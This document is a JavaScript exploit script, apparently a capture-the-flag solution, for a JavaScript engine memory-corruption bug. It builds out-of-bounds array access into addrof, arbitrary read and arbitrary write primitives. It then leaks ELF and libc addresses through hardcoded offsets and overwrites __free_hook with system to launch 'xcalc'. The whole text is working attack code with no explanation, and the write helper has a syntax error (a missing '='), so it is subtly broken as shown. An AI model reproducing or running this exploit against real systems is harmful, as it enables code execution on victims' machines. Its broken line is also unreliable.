let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);

const ftoi = x => {
  f64[0] = x;
  return i64[0];
};

const itof = x => {
  i64[0] = x;
  return f64[0];
};

function foo() {
  let oob = [1.1].slice(0, 1);

  let obj = [{}];
  let flt = [1.1];
  
  let a = ftoi(oob[2]) & 0xffffffffn;
  oob[2] = itof(((1337n << 1n) << 32n) + a);
  return { oob, obj, flt };
}

/* flt.elements @ oob[13] */
/* obj.elements @ oob[4] */
let { oob, obj, flt } = foo();

const addrof = o => {
  obj[0] = o;
  return (ftoi(oob[4]) & 0xffffffffn) - 1n;
};

const read = p => {
  let a = ftoi(oob[13]) >> 32n;
  oob[13] = itof((a << 32n) + p - 8n + 1n);
  return ftoi(flt[0]);
};

const write = (p, x) => {
  let a = ftoi(oob[13]) >> 32n;
  oob[13] = itof((a << 32n) + p - 8n + 1n);
  flt[0] itof(x);
};

let map = (read(addrof(oob)) & 0xffffffffn) - 0x438fdn;
let ptr = read(map + 0x40n) & 0xffffffffn;
let elf = read(ptr) - 0x14df688n; 

let libc = read(elf + 0x152df20n) - 0x84420n;
let __free_hook = libc + 0x1eee48n;
let system = libc + 0x52290n;

write(__free_hook, system); 
console.log("xcalc");

